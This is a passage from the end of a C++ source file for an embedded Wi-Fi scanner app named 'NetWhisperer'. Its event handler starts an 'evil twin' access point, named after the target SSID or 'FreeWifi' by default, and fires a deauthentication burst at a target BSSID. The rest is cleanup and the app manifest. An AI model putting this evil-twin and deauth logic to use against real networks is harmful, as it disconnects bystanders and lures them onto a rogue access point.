                    if (found && channel >= 1 && channel <= 13) {
                        if (activate) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                            setCaptureLockChannel(channel);
                            startEvilTwinAp(ssid[0] != '\0' ? ssid : "FreeWifi", channel);
                            sendDeauthBurstOnChannel(bssid, channel, nullptr);
                        } else {
                            stopEvilTwinAp();
                            setCaptureLockChannel(0);
                        }
                    }
                }
                app_manager_stop(event.result.launch_id);
            }
        }
    }

    romhack_keypad_set_media_cb(nullptr);
    if (g_tactical_mode) {
        setTacticalMode(&ctx, false);
    }
    g_active_scanner_ctx = nullptr;

    stopTimer(&ctx);
    stopCapture(&ctx);
    stopEvilTwinAp();
    service::wifi::setAutoScanPaused(false);
    restoreLedConfig(&ctx);

    window_manager_remove(ctx.window);
    check(app_event_unsubscribe(&sub) == ERROR_NONE);
    task_event_group_destruct(&event_group);

    return 0;
}

} // namespace

extern const ::AppManifest manifest = {
    .id = "WifiScanner",
    .name = "NetWhisperer",
    .category = APP_CATEGORY_SYSTEM,
    .location = { APP_LOCATION_MEMORY, reinterpret_cast<void*>(appMain) }
};

} // namespace tt::app::wifiscanner